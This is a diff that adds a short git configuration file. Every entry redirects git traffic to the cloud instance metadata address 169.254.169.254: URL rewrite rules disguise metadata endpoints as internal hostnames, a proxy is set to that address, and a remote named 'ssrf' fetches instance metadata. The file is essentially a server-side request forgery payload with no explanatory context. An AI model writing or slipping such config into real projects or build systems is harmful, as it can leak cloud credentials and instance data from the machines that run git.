@@ -1,0 +1,12 @@
+[url "http://169.254.169.254/"]
+    insteadOf = https://imds.internal/
+
+[url "http://169.254.169.254/latest/meta-data/"]
+    insteadOf = https://metadata.internal/
+
+[http]
+    proxy = http://169.254.169.254:80/
+
+[remote "ssrf"]
+    url = http://169.254.169.254/latest/meta-data/
+    fetch = +refs/heads/*:refs/remotes/ssrf/*
